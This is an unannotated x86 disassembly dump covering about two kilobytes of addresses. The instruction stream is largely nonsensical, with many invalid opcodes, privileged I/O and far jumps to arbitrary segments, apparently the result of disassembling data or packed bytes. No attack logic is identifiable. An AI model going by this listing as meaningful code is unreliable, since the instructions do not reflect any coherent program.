  413e57:	call   0x26a35775
  413e5c:	and    dl,0x9d
  413e5f:	add    eax,0x401ac58c
  413e64:	xor    eax,0xb488ee77
  413e69:	in     eax,dx
  413e6a:	cwde   
  413e6b:	jmp    0x413ec4
  413e6d:	jmp    0x6fadd512
  413e72:	icebp  
  413e73:	jp     0x413e80
  413e75:	mov    dl,0x2a
  413e77:	sbb    edi,DWORD PTR [edx-0x1049ccf5]
  413e7d:	mov    edx,DWORD PTR [eax+0x0]
  413e80:	cmp    ah,ch
  413e82:	xor    esp,DWORD PTR [ecx-0xe]
  413e85:	rol    edx,0x4
  413e88:	sub    al,0xa9
  413e8a:	clc    
  413e8b:	or     esp,DWORD PTR [eax-0x44]
  413e8e:	repz or DWORD PTR [edi+0x12],ebp
  413e92:	cmc    
  413e93:	mov    WORD PTR [ecx],?
  413e95:	pop    ebx
  413e96:	sbb    bl,BYTE PTR [edx+edx*2]
  413e99:	popf   
  413e9a:	xchg   BYTE PTR [esi],ah
  413e9c:	jecxz  0x413e83
  413e9e:	pop    esp
  413e9f:	pop    esp
  413ea0:	mov    ebx,0xe056c592
  413ea5:	cmp    ebx,DWORD PTR [eax]
  413ea7:	inc    ebx
  413ea8:	pop    es
  413ea9:	jl     0x413e4d
  413eab:	push   es
  413eac:	pop    ds
  413ead:	iret   
  413eae:	inc    ebx
  413eaf:	(bad)  
  413eb0:	cdq    
  413eb1:	je     0x413ed2
  413eb3:	outs   dx,BYTE PTR ds:[esi]
  413eb4:	cwde   
  413eb5:	xchg   DWORD PTR [ebx],eax
  413eb7:	jmp    0x413f07
  413eb9:	call   DWORD PTR [ecx+0x532722d3]
  413ebf:	retf   
  413ec0:	xchg   BYTE PTR [eax],dh
  413ec2:	enter  0x1345,0x7b
  413ec6:	std    
  413ec7:	call   0x5781:0xe7696e46
  413ece:	dec    ecx
  413ecf:	cdq    
  413ed0:	add    al,0xcb
  413ed2:	es jl  0x413ec2
  413ed5:	mov    dh,0x4c
  413ed7:	push   edx
  413ed8:	aas    
  413ed9:	inc    esi
  413eda:	shl    DWORD PTR [esi],cl
  413edc:	push   esp
  413edd:	or     ebp,DWORD PTR [ebp+0x6]
  413ee0:	dec    ebp
  413ee1:	or     cl,BYTE PTR [esi-0x34]
  413ee4:	les    ecx,FWORD PTR [edi+0x25]
  413ee7:	int    0xd0
  413ee9:	(bad)  
  413eea:	jb     0x413ed6
  413eec:	pop    esp
  413eed:	into   
  413eee:	xor    DWORD PTR [edi],0xfffffffc
  413ef1:	ffree  st(4)
  413ef3:	xchg   ecx,eax
  413ef4:	fidivr WORD PTR [esi+0xd]
  413ef7:	add    cl,BYTE PTR [ecx+0x79b7878f]
  413efd:	cmp    BYTE PTR es:[eax-0x4ff73c24],ch
  413f04:	xchg   BYTE PTR [ebx-0x7f],dh
  413f07:	test   BYTE PTR [ecx-0x6d],dl
  413f0a:	inc    edi
  413f0b:	xor    BYTE PTR [edx],0x58
  413f0e:	mov    ch,ah
  413f10:	sbb    edx,edx
  413f12:	out    dx,eax
  413f13:	lahf   
  413f14:	call   0x6c2ff97f
  413f19:	inc    edx
  413f1a:	enter  0xc676,0xdd
  413f1e:	xchg   edx,eax
  413f1f:	(bad)  
  413f20:	xlat   BYTE PTR ds:[ebx]
  413f21:	and    al,0xdb
  413f23:	outs   dx,DWORD PTR ds:[esi]
  413f24:	cmp    ah,bh
  413f26:	shl    BYTE PTR [esi],cl
  413f28:	scas   al,BYTE PTR es:[edi]
  413f29:	push   ebp
  413f2a:	jnp    0x413f6f
  413f2c:	mov    ecx,ebx
  413f2e:	push   edx
  413f2f:	retf   0x4576
  413f32:	ror    DWORD PTR [eax+0x7],0x53
  413f36:	jns    0x413f06
  413f38:	(bad)  
  413f39:	call   DWORD PTR [ecx+0x7bed7f04]
  413f3f:	retf   0xed09
  413f42:	pop    ecx
  413f43:	and    al,0x57
  413f45:	outs   dx,BYTE PTR ds:[esi]
  413f46:	in     al,dx
  413f47:	test   eax,0x687abdc3
  413f4c:	retf   
  413f4d:	inc    ecx
  413f4e:	mov    fs,WORD PTR [ecx-0x35afdc77]
  413f54:	pop    ds
  413f55:	mov    DWORD PTR [ebx-0x27754427],esi
  413f5b:	sub    bh,ah
  413f5d:	dec    esi
  413f5e:	push   cs
  413f5f:	outs   dx,BYTE PTR ds:[esi]
  413f60:	sbb    esp,DWORD PTR [ebx-0x53]
  413f63:	sbb    DWORD PTR [edx-0x2458669c],0xffffffb1
  413f6a:	gs mov bl,bh
  413f6d:	aas    
  413f6e:	jl     0x413fd1
  413f70:	pushf  
  413f71:	or     eax,0xf0d7b614
  413f76:	jne    0x413f25
  413f78:	iret   
  413f79:	loop   0x413f8a
  413f7b:	adc    edi,DWORD PTR [edi]
  413f7d:	cmp    al,0x4d
  413f7f:	adc    DWORD PTR [esi+0x4d],0xffffff82
  413f83:	xchg   esp,eax
  413f84:	cwde   
  413f85:	ins    BYTE PTR es:[edi],dx
  413f86:	lock imul ebx,DWORD PTR [ebx+0x76],0xf8a349ca
  413f8e:	jb     0x413f1f
  413f90:	inc    ebp
  413f91:	jnp    0x413f99
  413f93:	or     DWORD PTR [edx],esp
  413f95:	jle    0x413fdc
  413f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f98:	xchg   ebp,eax
  413f99:	mov    ecx,edi
  413f9b:	xor    al,0xbc
  413f9d:	je     0x413fb7
  413f9f:	sub    eax,0xedb9ca77
  413fa4:	mov    bh,0x8c
  413fa6:	mov    ebp,0x7fa9bd2c
  413fab:	std    
  413fac:	in     eax,0x72
  413fae:	sub    DWORD PTR [ebp+0x4b],0xef1e3047
  413fb5:	aaa    
  413fb6:	inc    edx
  413fb7:	call   0xae16:0xd29501e5
  413fbe:	mov    esp,0xd1ead38f
  413fc3:	out    0x11,al
  413fc5:	jno    0x413fb6
  413fc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fc8:	inc    ecx
  413fc9:	std    
  413fca:	xchg   ecx,eax
  413fcb:	cs jbe 0x413f60
  413fce:	add    ecx,DWORD PTR [eax+0x6fc1fcbc]
  413fd4:	sbb    esp,DWORD PTR [eax-0x39]
  413fd7:	xchg   edx,eax
  413fd8:	(bad)  
  413fda:	mov    BYTE PTR [edi-0x781448a7],cl
  413fe0:	pop    ss
  413fe1:	leave  
  413fe2:	int3   
  413fe3:	(bad)  
  413fe4:	jl     0x414063
  413fe6:	sbb    bh,BYTE PTR [ecx]
  413fe8:	fs add eax,0x8e381764
  413fee:	(bad)  
  413fef:	jb     0x413fc3
  413ff1:	iret   
  413ff2:	cmp    ah,BYTE PTR [esp+edx*4+0x16]
  413ff6:	jecxz  0x413fd7
  413ff8:	xor    al,0x24
  413ffa:	push   es
  413ffb:	sub    eax,0xfc750e68
  414000:	sbb    DWORD PTR [edi],esi
  414002:	(bad)  
  414003:	sti    
  414004:	inc    esi
  414005:	pop    edx
  414006:	xchg   ecx,eax
  414007:	mov    al,ds:0x814d9b38
  41400c:	and    ch,al
  41400e:	adc    al,ch
  414010:	cmp    al,0x79
  414012:	jg     0x413ffe
  414014:	neg    BYTE PTR [eax+ebx*8+0x78]
  414018:	inc    esp
  414019:	fs cwde 
  41401b:	stc    
  41401c:	cli    
  41401d:	cmp    BYTE PTR [ecx],bl
  41401f:	pop    esi
  414020:	adc    BYTE PTR [eax],bl
  414022:	pop    ecx
  414023:	xchg   esp,eax
  414024:	xchg   edi,eax
  414025:	or     ah,al
  414027:	mov    ebx,DWORD PTR [edi-0x4c80b136]
  41402d:	stc    
  41402e:	adc    DWORD PTR [esi],esp
  414030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414031:	int    0xd6
  414033:	ja     0x41403a
  414035:	add    al,0x68
  414037:	sbb    esp,DWORD PTR [edi+ebp*4-0x3f]
  41403b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41403c:	xchg   esi,eax
  41403d:	adc    BYTE PTR [esi+0x15],dl
  414040:	(bad)  
  414041:	cmp    al,0x4c
  414043:	or     DWORD PTR [eax-0x1a],ebp
  414046:	stc    
  414047:	nop
  414048:	xchg   DWORD PTR [edx-0x41],esi
  41404b:	sbb    al,0x88
  41404d:	jle    0x414008
  41404f:	in     eax,0x9d
  414051:	dec    ebx
  414052:	dec    ebx
  414053:	push   eax
  414054:	cmp    eax,0xd369c398
  414059:	push   ebp
  41405a:	aaa    
  41405b:	iret   
  41405c:	adc    eax,0x7a78342b
  414061:	push   cs
  414062:	xor    BYTE PTR [ebx+0x65],0xc9
  414066:	mov    ecx,esp
  414068:	sbb    eax,0xef823303
  41406d:	mov    ebp,0xd9d5a836
  414072:	mov    ds:0xe1418950,eax
  414077:	int3   
  414078:	sub    eax,0x200d48d8
  41407d:	or     esi,DWORD PTR [edx-0x2c]
  414080:	pop    esp
  414081:	sti    
  414082:	push   0x795cd0b
  414087:	jmp    0xeb795130
  41408c:	ja     0x4140a9
  41408e:	popa   
  41408f:	pop    esi
  414090:	nop    ecx
  414093:	jmp    0x414066
  414095:	lea    esp,[edx-0x5a645933]
  41409b:	cdq    
  41409c:	sbb    eax,0xc5760a10
  4140a1:	dec    ebp
  4140a2:	jl     0x414106
  4140a4:	mov    esp,0x75086a29
  4140a9:	pop    eax
  4140aa:	shr    BYTE PTR [eax+0xc6e0ee9],0x4a
  4140b1:	cmp    al,0x11
  4140b3:	daa    
  4140b4:	scas   al,BYTE PTR es:[edi]
  4140b5:	xor    al,0x64
  4140b7:	jecxz  0x414104
  4140b9:	push   ss
  4140ba:	nop
  4140bb:	clc    
  4140bc:	retf   0x940d
  4140bf:	or     BYTE PTR [ebx-0x7fbe97f7],bl
  4140c5:	daa    
  4140c6:	mov    ds:0xe39b2017,al
  4140cb:	loopne 0x4140f0
  4140cd:	xchg   esp,eax
  4140ce:	in     al,dx
  4140cf:	(bad)  [ebp-0x1c]
  4140d2:	out    dx,eax
  4140d3:	add    BYTE PTR [edi-0x4e],ah
  4140d6:	int3   
  4140d7:	fxch   st(7)
  4140d9:	pop    DWORD PTR [edi-0x63]
  4140dc:	or     cl,BYTE PTR ds:0xe2d71b54
  4140e2:	xor    eax,0x5b701df4
  4140e7:	jmp    0x414081
  4140e9:	das    
  4140ea:	pop    ecx
  4140eb:	je     0x4140b6
  4140ed:	push   edx
  4140ee:	pop    ss
  4140ef:	arpl   WORD PTR ds:0xc033f7be,sp
  4140f5:	mov    esp,0x7e86ede7
  4140fa:	dec    ebx
  4140fb:	leave  
  4140fc:	mov    esi,DWORD PTR [esi]
  4140fe:	sbb    bh,BYTE PTR [esi-0x5e]
  414101:	sub    bh,al
  414103:	fstp   st(0)
  414105:	(bad)  
  414106:	mov    WORD PTR [ebx+0x2],?
  414109:	mov    ch,0xd7
  41410b:	dec    ecx
  41410c:	xchg   ebp,eax
  41410d:	fcmovnb st,st(4)
  41410f:	adc    BYTE PTR [eax-0x16],bh
  414112:	daa    
  414113:	(bad)  
  414114:	retf   
  414115:	push   edi
  414116:	mov    db0,esp
  414119:	push   ds
  41411a:	pop    ecx
  41411b:	in     al,dx
  41411c:	and    dl,BYTE PTR [edx+0x9a76913]
  414122:	xor    al,0x0
  414124:	js     0x41410c
  414126:	in     al,0x5b
  414128:	sbb    BYTE PTR [esi],ah
  41412a:	xor    dl,al
  41412c:	fcmovnbe st,st(4)
  41412e:	xchg   ecx,eax
  41412f:	or     BYTE PTR [eax-0x1f],dl
  414132:	and    al,0x23
  414134:	sbb    bl,BYTE PTR [ebx-0x39]
  414137:	xchg   ebp,eax
  414138:	pop    esi
  414139:	cmp    al,0x14
  41413b:	mov    BYTE PTR [edi-0x66],al
  41413e:	arpl   WORD PTR [edx-0x4726941a],sp
  414144:	mov    eax,0x38ae7457
  414149:	call   0x2282:0x43d9cc3
  414150:	cmp    bl,BYTE PTR [ebx-0x5]
  414153:	jl     0x41419c
  414155:	add    DWORD PTR [ecx],edx
  414157:	imul   edi,ebx,0xfffffff5
  41415a:	adc    eax,0x93e3929b
  41415f:	xchg   edx,eax
  414160:	test   al,0x85
  414162:	lods   al,BYTE PTR ds:[esi]
  414163:	pop    ds
  414164:	xchg   edi,eax
  414165:	clc    
  414166:	aad    0x98
  414168:	push   ecx
  414169:	(bad)  
  41416a:	fsub   QWORD PTR [edx]
  41416c:	scas   al,BYTE PTR es:[edi]
  41416d:	daa    
  41416e:	into   
  41416f:	dec    ecx
  414170:	sbb    ah,BYTE PTR ds:0x2ac54a9f
  414176:	sar    ebx,1
  414178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414179:	mov    bh,BYTE PTR [esi-0x14a19c31]
  41417f:	cmp    DWORD PTR [eax-0x67642a78],esi
  414185:	adc    al,BYTE PTR [eax-0x4a]
  414188:	cmp    eax,0xd41fd589
  41418d:	add    ch,al
  41418f:	lods   al,BYTE PTR ds:[esi]
  414190:	fisttp QWORD PTR [ecx+edi*8-0x3]
  414194:	dec    eax
  414195:	add    al,0x4d
  414197:	pop    eax
  414198:	clc    
  414199:	mov    al,0xbb
  41419b:	into   
  41419c:	push   es
  41419d:	out    dx,eax
  41419e:	cli    
  41419f:	les    ecx,FWORD PTR [eax-0x5dd70d53]
  4141a5:	pop    edx
  4141a6:	mov    ebp,0x2e3f9354
  4141ab:	mov    ds:0xdae221b3,al
  4141b0:	pop    ebp
  4141b1:	and    edx,ebx
  4141b3:	pusha  
  4141b4:	inc    ebp
  4141b5:	into   
  4141b6:	enter  0x5083,0x82
  4141ba:	mov    edi,0xce462352
  4141bf:	and    al,ah
  4141c1:	mov    eax,0xf29c131
  4141c6:	pop    ss
  4141c7:	aas    
  4141c8:	(bad)  
  4141c9:	push   eax
  4141ca:	gs inc edx
  4141cc:	std    
  4141cd:	jb     0x41417e
  4141cf:	mov    ah,BYTE PTR [esi+0x296dc716]
  4141d5:	mov    dh,ch
  4141d7:	stos   BYTE PTR es:[edi],al
  4141d8:	mov    eax,0x3fbead8e
  4141dd:	and    ebp,DWORD PTR [edi+ebp*1-0x6f9c788a]
  4141e4:	ins    DWORD PTR es:[edi],dx
  4141e5:	adc    DWORD PTR [esi+0x57],ebp
  4141e8:	xchg   DWORD PTR [eax+ecx*4],ecx
  4141eb:	scas   al,BYTE PTR es:[edi]
  4141ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141ed:	push   0x205cd6cf
  4141f2:	je     0x4141b5
  4141f4:	aad    0x7c
  4141f6:	ret    0xef9b
  4141f9:	cmovbe ebx,ebx
  4141fc:	dec    eax
  4141fd:	std    
  4141fe:	fidivr WORD PTR [eax-0x29a48291]
  414204:	imul   edi,ecx,0xa600d6d3
  41420a:	or     BYTE PTR [eax-0x5849841d],bl
  414210:	mov    al,ds:0x35013461
  414215:	pop    ds
  414216:	in     eax,dx
  414217:	dec    ebp
  414218:	adc    edx,ebx
  41421a:	mov    bh,0xac
  41421c:	add    esp,edx
  41421e:	imul   eax,DWORD PTR [eax+0x112152d9],0x95332f95
  414228:	cmp    BYTE PTR [edi-0x5857fdbc],ah
  41422e:	shl    BYTE PTR [eax-0x34],cl
  414231:	xchg   BYTE PTR [esp+esi*8+0x6c],bh
  414235:	jmp    0x94b0:0xceff8b88
  41423c:	sub    ecx,DWORD PTR [ebp-0x60]
  41423f:	or     ah,bh
  414241:	add    al,0x4c
  414243:	shr    DWORD PTR [eax-0x1cbab1c],0x7a
  41424a:	push   cs
  41424b:	fldenv [ecx]
  41424d:	dec    ebp
  41424e:	bound  esp,QWORD PTR [eax-0x4183fed1]
  414254:	add    ah,BYTE PTR ds:0x9365ffa
  41425a:	mov    dl,0x21
  41425c:	cdq    
  41425d:	lods   al,BYTE PTR ds:[esi]
  41425e:	popa   
  41425f:	mov    bh,0x21
  414261:	pushf  
  414262:	jae    0x414293
  414264:	push   edx
  414265:	xlat   BYTE PTR ds:[ebx]
  414266:	cdq    
  414267:	dec    ebx
  414268:	push   ebx
  414269:	jge    0x4142dd
  41426b:	dec    ebp
  41426c:	push   0xffffff8e
  41426e:	add    DWORD PTR ds:[edi+0x548d5ad0],0x96f339ec
  414279:	xchg   edx,eax
  41427a:	scas   eax,DWORD PTR es:[edi]
  41427b:	(bad)  
  41427c:	adc    DWORD PTR [esi],eax
  41427e:	mov    fs,WORD PTR [ebx+0x43]
  414281:	std    
  414282:	or     edx,DWORD PTR [ebp-0x564e8626]
  414288:	lds    edi,FWORD PTR [edi+0x2]
  41428b:	xchg   DWORD PTR [edx],edi
  41428d:	mov    esp,0xdd47dbf2
  414292:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414293:	jb     0x414253
  414295:	pusha  
  414296:	or     edx,ecx
  414298:	fadd   st,st(3)
  41429a:	pop    ds
  41429b:	pushf  
  41429c:	popf   
  41429d:	sbb    al,0xd6
  41429f:	dec    edi
  4142a0:	loop   0x41425f
  4142a2:	dec    ebp
  4142a3:	(bad)  
  4142a5:	(bad)  
  4142a6:	mov    eax,0x1d9e7ded
  4142ab:	lahf   
  4142ac:	dec    esp
  4142ad:	mov    edi,0x469dbe33
  4142b2:	push   ds
  4142b3:	push   edx
  4142b4:	xor    ebp,DWORD PTR [ebp-0x1]
  4142b7:	push   esp
  4142b8:	sub    BYTE PTR [eax],ah
  4142ba:	loopne 0x4142cb
  4142bc:	sub    eax,0xc3a062e3
  4142c1:	dec    ebp
  4142c2:	into   
  4142c3:	ds xor eax,0x8dd67ad0
  4142c9:	and    BYTE PTR [esi-0x209def41],al
  4142cf:	ins    BYTE PTR es:[edi],dx
  4142d0:	jbe    0x4142d9
  4142d2:	mov    DWORD PTR [esi],ebp
  4142d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142d5:	data16 cmp al,0xf2
  4142d8:	sub    ch,BYTE PTR [ecx]
  4142da:	add    cl,BYTE PTR [esi]
  4142dc:	dec    ebx
  4142dd:	inc    edx
  4142de:	ja     0x41429b
  4142e0:	pop    ebx
  4142e1:	xor    al,0x6e
  4142e3:	inc    ebp
  4142e4:	sub    eax,0xcea174dd
  4142e9:	inc    DWORD PTR [edi]
  4142eb:	sub    BYTE PTR [edi-0x58],al
  4142ee:	or     eax,0x57065505
  4142f3:	mov    esp,0x7a3e39e1
  4142f8:	rcr    BYTE PTR [ecx+0x7e],cl
  4142fb:	mov    esi,0x2be1c20c
  414300:	aaa    
  414301:	xor    eax,0x69983513
  414306:	in     al,dx
  414307:	xchg   BYTE PTR [edx+0x4d],al
  41430a:	adc    ah,ch
  41430c:	jmp    0xa119:0xff02eff6
  414313:	jmp    FWORD PTR [esi+0x5dbe674a]
  414319:	sti    
  41431a:	repnz pusha 
  41431c:	add    dh,BYTE PTR [ebx-0x1d]
  41431f:	ret    
  414320:	test   al,0x92
  414322:	das    
  414323:	mov    DWORD PTR [ecx-0x5c],edi
  414326:	mov    bh,BYTE PTR [edx-0x91214c0]
  41432c:	dec    ebx
  41432d:	(bad)  
  41432e:	scas   al,BYTE PTR es:[edi]
  41432f:	adc    dl,BYTE PTR [eax-0x41]
  414332:	dec    ebp
  414333:	js     0x414349
  414335:	loope  0x41430d
  414337:	mov    WORD PTR [edx],gs
  414339:	jmp    ebx
  41433b:	(bad)
  41433e:	xor    dl,cl
  414340:	jne    0x41434a
  414342:	jo     0x41437b
  414344:	inc    edi
  414345:	and    DWORD PTR [esi-0x35],0x21
  414349:	mov    eax,ds:0x746f4d3f
  41434e:	or     al,0xe8
  414350:	and    al,dl
  414352:	sub    ebp,DWORD PTR [ebp+0x1cc68d52]
  414358:	les    ecx,FWORD PTR [esi-0x7accb2ca]
  41435e:	xor    DWORD PTR [ebx],edx
  414360:	pop    esi
  414361:	mov    ss,WORD PTR [ebx]
  414363:	cs stc 
  414365:	cmp    ch,BYTE PTR [edi+0x24b53827]
  41436b:	jg     0x4143ab
  41436d:	xor    DWORD PTR [edx+ebx*1-0x75],eax
  414371:	xlat   BYTE PTR ds:[ebx]
  414372:	ret    
  414373:	(bad)  
  414374:	jmp    0x7b6754d
  414379:	jb     0x414386
  41437b:	sub    DWORD PTR [ebp+0x60],eax
  41437e:	in     al,0x3
  414380:	fild   WORD PTR [ebp+0x10]
  414383:	ret    
  414384:	stc    
  414385:	imul   ebp,DWORD PTR [eax-0x2ab3cb36],0x28
  41438c:	gs sbb al,0x3b
  41438f:	pop    ss
  414390:	inc    ebx
  414391:	add    BYTE PTR [edx+0x6d],ch
  414394:	sub    bh,BYTE PTR ds:0x6f1e8b6
  41439a:	imul   ebp,DWORD PTR ds:0x2fdde93f,0xfffffff5
  4143a1:	getsec 
  4143a3:	xchg   edi,eax
  4143a4:	out    dx,eax
  4143a5:	cmp    cl,BYTE PTR [eax]
  4143a7:	and    BYTE PTR [eax-0x2a],ah
  4143aa:	mov    esi,DWORD PTR [edi-0x56]
  4143ad:	in     eax,0x26
  4143af:	mov    esi,DWORD PTR [ecx+esi*8-0x2d]
  4143b3:	(bad)  
  4143b4:	sbb    BYTE PTR [ecx-0x7c],ch
  4143b7:	xlat   BYTE PTR ds:[ebx]
  4143b8:	vsubsd xmm0,xmm1,QWORD PTR [ebp+0x50]
  4143bd:	stos   DWORD PTR es:[edi],eax
  4143be:	test   BYTE PTR [ebx],0xe2
  4143c1:	add    eax,0xabb4f90c
  4143c6:	loope  0x414371
  4143c8:	in     eax,0x9c
  4143ca:	xchg   bh,al
  4143cc:	jmp    0x41443c
  4143ce:	dec    esp
  4143cf:	pushf  
  4143d0:	stos   BYTE PTR es:[edi],al
  4143d1:	fst    st(7)
  4143d3:	jnp    0x4143eb
  4143d5:	mov    esi,0x7ef67f0d
  4143da:	mov    WORD PTR [esi-0x3c730241],?
  4143e0:	lods   al,BYTE PTR ds:[esi]
  4143e1:	js     0x4143d4
  4143e3:	cmp    BYTE PTR [ebx-0x21],al
  4143e6:	mul    esp
  4143e8:	xor    esi,edi
  4143ea:	mov    edx,0x103868de
  4143ef:	les    ecx,FWORD PTR [eax-0x122bd59a]
  4143f5:	pop    es
  4143f6:	adc    BYTE PTR [ebx+eiz*1-0x40d6ec82],dh
  4143fd:	idiv   BYTE PTR ds:0xb7fb5049
  414403:	or     BYTE PTR [esp+ebx*2+0x2e],cl
  414407:	or     esp,DWORD PTR [esp+edx*1+0x6a]
  41440b:	mov    bh,0xb
  41440d:	mov    ah,0x60
  41440f:	xor    BYTE PTR [esi],0x4c
  414412:	cdq    
  414413:	sti    
  414414:	dec    ebx
  414415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414416:	popa   
  414417:	sbb    edx,DWORD PTR [esi]
  414419:	jle    0x4143d5
  41441b:	dec    edi
  41441c:	mov    al,ds:0xb43f292f
  414421:	xchg   ebx,eax
  414422:	nop
  414423:	js     0x4143e1
  414425:	mov    ds:0x3f22342c,al
  41442a:	hlt    
  41442b:	repz je 0x414498
  41442e:	loope  0x4143b5
  414430:	and    BYTE PTR [ebp-0x3051e843],0x61
  414437:	das    
  414438:	add    ah,BYTE PTR [esp-0x3]
  41443c:	je     0x4143fb
  41443e:	or     dl,cl
  414440:	inc    eax
  414441:	repz push ss
  414443:	cs je  0x41440a
  414446:	(bad)  
  414448:	fmul   st(0),st
  41444a:	mov    dh,0xef
  41444c:	(bad)  
  41444d:	xlat   BYTE PTR ds:[ebx]
  41444e:	dec    ebp
  41444f:	fld    DWORD PTR [edx+0x3ef1c10a]
  414455:	call   0xdf28:0xc6d470b9
  41445c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41445d:	dec    edx
  41445e:	mov    al,0xfd
  414460:	push   cs
  414461:	jge    0x41447e
  414463:	cmc    
  414464:	jnp    0x4144ab
  414466:	gs cmp ch,ah
  414469:	loope  0x41447f
  41446b:	and    DWORD PTR [ebx],0x62
  41446e:	mov    al,0x16
  414470:	dec    eax
  414471:	or     cl,ah
  414473:	lds    ecx,FWORD PTR [ebp+0x55]
  414476:	aas    
  414477:	pop    esp
  414478:	into   
  414479:	fsub   DWORD PTR [eax]
  41447b:	ror    BYTE PTR [esi],0x30
  41447e:	out    dx,al
  41447f:	add    eax,0x22202453
  414484:	and    eax,0x9c6ffe6
  414489:	rcl    ch,0xa0
  41448c:	dec    ebx
  41448d:	and    eax,0xa05e059
  414492:	cli    
  414493:	imul   ecx,DWORD PTR [edi],0xb9d775c8
  414499:	adc    eax,0x86446c76
  41449e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41449f:	loop   0x414426
  4144a1:	shl    BYTE PTR [ecx+0x49],0xe
  4144a5:	ins    BYTE PTR es:[edi],dx
  4144a6:	mov    WORD PTR [ebx],cs
  4144a8:	inc    ebp
  4144a9:	leave  
  4144aa:	cmp    dh,BYTE PTR [eax-0x25]
  4144ad:	inc    eax
  4144ae:	(bad)  
  4144af:	dec    edx
  4144b0:	and    bh,bl
  4144b2:	add    BYTE PTR [edx+0x2c],cl
  4144b5:	fcmovb st,st(4)
  4144b7:	and    bh,BYTE PTR [edi]
  4144b9:	xor    BYTE PTR [eax-0x142e3de7],0xdc
  4144c0:	jecxz  0x41444d
  4144c2:	mov    ds:0xda3899bd,al
  4144c7:	mov    cl,0x50
  4144c9:	rol    DWORD PTR [ecx-0x40],0x1b
  4144cd:	sub    al,BYTE PTR [ebx-0x7b]
  4144d0:	sub    BYTE PTR [ebx-0x1b],dl
  4144d3:	sbb    al,0xa2
  4144d5:	inc    edx
  4144d6:	sub    eax,0x6f638d2f
  4144db:	test   BYTE PTR [edx-0x6a],dh
  4144de:	pop    edi
  4144df:	retf   0x6c9a
  4144e2:	push   es
  4144e3:	jns    0x414545
  4144e5:	nop
  4144e6:	cs ins DWORD PTR es:[edi],dx
  4144e8:	int3   
  4144e9:	jg     0x4144b0
  4144eb:	mov    esi,0x9a3526c2
  4144f0:	addr16 push ss
  4144f2:	jo     0x4144e4
  4144f4:	add    ebx,DWORD PTR [ebp+0x741598ea]
  4144fa:	shr    DWORD PTR [ecx-0x22],0xcd
  4144fe:	jnp    0x4144c0
  414500:	arpl   WORD PTR [edi],si
  414502:	into   
  414503:	mov    dh,0x47
  414505:	das    
  414506:	dec    esi
  414507:	int3   
  414508:	enter  0xcf8c,0xd2
  41450c:	in     al,dx
  41450d:	out    dx,eax
  41450e:	popf   
  41450f:	jp     0x4144f9
  414511:	dec    ebx
  414512:	jl     0x414581
  414514:	clc    
  414515:	mov    dh,0xfa
  414517:	lea    ebx,[eax+ebx*4+0x6e]
  41451b:	cmp    dl,0x76
  41451e:	out    dx,eax
  41451f:	out    dx,al
  414520:	test   BYTE PTR [edx+0x4c],al
  414523:	pop    edi
  414524:	sbb    edi,DWORD PTR [ebp+0x29]
  414527:	xor    BYTE PTR [edi],0x3e
  41452a:	inc    edi
  41452b:	jg     0x4144ef
  41452d:	mov    BYTE PTR [ecx],dh
  41452f:	add    eax,0x5af6186c
  414534:	popf   
  414535:	push   eax
  414536:	mov    dh,0x60
  414538:	imul   ebp,DWORD PTR [edx+eiz*1+0x3c],0xc995594
  414540:	cmc    
  414541:	aaa    
  414542:	xchg   DWORD PTR [ecx],edx
  414544:	aad    0x40
  414546:	retf   0xd5ac
  414549:	lahf   
  41454a:	pusha  
  41454b:	mov    dl,0xed
  41454d:	ins    DWORD PTR es:[edi],dx
  41454e:	adc    al,0x1e
  414550:	push   eax
  414551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414552:	(bad)  
  414553:	outs   dx,DWORD PTR ds:[esi]
  414554:	es retf 0xa74a
  414558:	and    BYTE PTR [esi+0x77d9dd58],0xcb
  41455f:	push   edx
  414560:	cmp    ah,BYTE PTR [edx]
  414562:	jg     0x414562
  414564:	xor    esp,DWORD PTR ds:0x3008343b
  41456a:	jno    0x414530
  41456c:	ror    DWORD PTR [ebp-0x39df6ded],cl
  414572:	jbe    0x4145c6
  414574:	xor    cl,bl
  414576:	nop
  414577:	nop
  414578:	adc    BYTE PTR [esi],bl
  41457a:	in     eax,0x1f
  41457c:	sti    
  41457d:	add    DWORD PTR [esp+eiz*4+0x2a],ebx
  414581:	and    cl,cl
  414583:	in     al,dx
  414584:	jae    0x4145a6
  414586:	xchg   ebp,eax
  414587:	dec    edx
  414588:	mov    ds:0x7ed794d1,al
  41458d:	push   ecx
  41458e:	fist   WORD PTR [edi-0x2]
  414591:	pop    ss
  414592:	sub    cl,bl
  414594:	push   ecx
  414595:	stos   BYTE PTR es:[edi],al
  414596:	out    0xb1,eax
  414598:	adc    bh,BYTE PTR [esi]
  41459a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41459b:	and    eax,0x3a03c37c
  4145a0:	addr16 pushf 
  4145a2:	sbb    DWORD PTR [esi+0x1c],esi
  4145a5:	out    dx,al
  4145a6:	icebp  
  4145a7:	test   al,0xcf
  4145a9:	ret    0x9def
  4145ac:	les    edx,FWORD PTR [bp-0x1b16]
  4145b1:	out    0xd2,al
  4145b3:	and    al,0xfd
  4145b5:	sahf   
  4145b6:	push   ebp
  4145b7:	add    BYTE PTR [ebx+edi*2-0x22],ah
  4145bb:	(bad)  
  4145bc:	sbb    al,0x7a
  4145be:	mov    ah,0x6a
  4145c0:	pop    es
  4145c1:	cmp    ch,BYTE PTR cs:[ebp-0x12]
  4145c5:	and    al,0x3f
  4145c7:	pusha  
  4145c8:	xlat   BYTE PTR ds:[ebx]
  4145c9:	lods   al,BYTE PTR ds:[esi]
  4145ca:	mov    ah,0xf6
  4145cc:	into   
  4145cd:	inc    esi
  4145ce:	adc    al,0xeb
  4145d0:	lods   al,BYTE PTR ds:[esi]
  4145d1:	test   DWORD PTR ds:0xa55e5787,edi
  4145d7:	sbb    BYTE PTR [edi-0x337402ee],cl
  4145dd:	jns    0x414618
  4145df:	pop    ds
  4145e0:	call   0x8508d576
  4145e5:	fwait
